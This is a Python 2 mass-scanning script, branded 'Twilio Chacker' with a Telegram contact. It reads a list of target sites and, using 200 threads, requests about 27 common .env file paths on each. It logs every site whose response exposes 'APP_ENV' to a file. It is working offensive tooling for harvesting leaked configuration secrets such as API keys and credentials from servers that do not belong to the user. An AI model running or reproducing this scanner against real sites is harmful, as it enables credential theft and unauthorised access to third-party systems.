import re, sys, requests, os, random, string, time, sys, os, threading, time, re, requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import requests, re, urllib, urllib2, os, sys, codecs, binascii, json, argparse
from multiprocessing.dummy import Pool
import requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import time
from random import sample as rand
from Queue import Queue
from platform import system
from urlparse import urlparse
from optparse import OptionParser
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
import sys, requests, re, datetime
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)
import requests, re, os, sys, codecs, random
from multiprocessing.dummy import Pool
from time import time as timer
import time
from colorama import Fore
from urlparse import urlparse
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from platform import system
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT
warnings.simplefilter('ignore', InsecureRequestWarning)
reload(sys)
sys.setdefaultencoding('utf8')
ktnred = '\x1b[31m'
ktngreen = '\x1b[32m'
ktn3yell = '\x1b[33m'
ktn4blue = '\x1b[34m'
ktn5purp = '\x1b[35m'
ktn6blueblue = '\x1b[36m'
ktn7grey = '\x1b[37m'
CEND = '\x1b[0m'

def urlfix(url):
    if url[(-1)] == '/':
        pattern = re.compile('(.*)/')
        site = re.findall(pattern, url)
        url = site[0]
    if url[:7] != 'http://' and url[:8] != 'https://':
        url = 'http://' + url
    return url


def EXPLOIT(url):
    try:
        paths = [
						"/__tests__/test-become/.env",
			"/redmine/.env",
			"/api/.env",
			"/gists/cache",
			"/uploads/.env",
			"/laravel/.env",
			"/backend/.env",
			"/lib/.env",
			"/.env.example",
			"/admin/.env",
			"/database/.env",
			"/main/.env",
			"/docs/.env",
			"/client/.env",
			"/blog/.env",
			"/.env.dev",
			"/core/.env",
			"/app/.env",
			"/apps/.env",
			"/blogs/.env",
			"/shared/.env",
			"/download/.env",
			"/.env.php",
			"/.env",
			"/site/.env",
			"/sites/.env",
			"/web/.env"]
        for path in paths:
            try:
                payload = url + path
                se3 = requests.session()
                Agent3 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
                ktn3 = se3.get(payload, headers=Agent3, verify=False, timeout=30)
                if 'APP_ENV' in ktn3.content:
                    print ('{}{} [SUCCESS ENV] ---->  [BETO] :').format(fy, sb) + url
                    open('ENVVULN.txt', 'a').write(payload + '\n')
                    break
                else:
                    print ('{}{} [NOT VULN ENV] [0] -------> ').format(fr, sb) + url
            except:
                print ('{}{} [FILED] -------> ').format(fr, sb) + url

    except:
        print ('{}{} Site Error !! [FILED] -------> ').format(fr, sb) + url


def check(url):
    try:
        url = urlfix(url)
        Agent = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        se = requests.session()
        ktn1 = se.get(url, headers=Agent, verify=False, timeout=30)
        if ktn1.status_code == 200:
            print ('{}{} [SITE IS WORKING LOOKING FOR VULN] ---->  [BETO] :').format(fy, sb) + url
            EXPLOIT(url)
        else:
            print ('{}{} SITE IS DOWN... -------> ').format(fr, sb) + url
    except:
        pass


def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """
                 _               _ _       _ _        _ 
                | |             | (_)     (_) |      | |
 _ __ ___   ___ | |__   ___   __| |_  __ _ _| |_ __ _| |
| '_ ` _ \ / _ \| '_ \ / _ \ / _` | |/ _` | | __/ _` | |
| | | | | | (_) | |_) | (_) | (_| | | (_| | | || (_| | |
|_| |_| |_|\___/|_.__/ \___/ \__,_|_|\__, |_|\__\__,_|_|
   Twilio Chacker                     __/ |             
   telegram @mobodigital             |___/                          
"""
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()

def Main():
    list = raw_input(('{}{}\n\t [ALL-ENV-VULN] List Please !  : ').format(fr, sb))
    list = open(list, 'r').read().splitlines()
    try:
        ThreadPool = Pool(200)
        Threads = ThreadPool.map(check, list)
    except:
        pass


if __name__ == '__main__':
    Main()
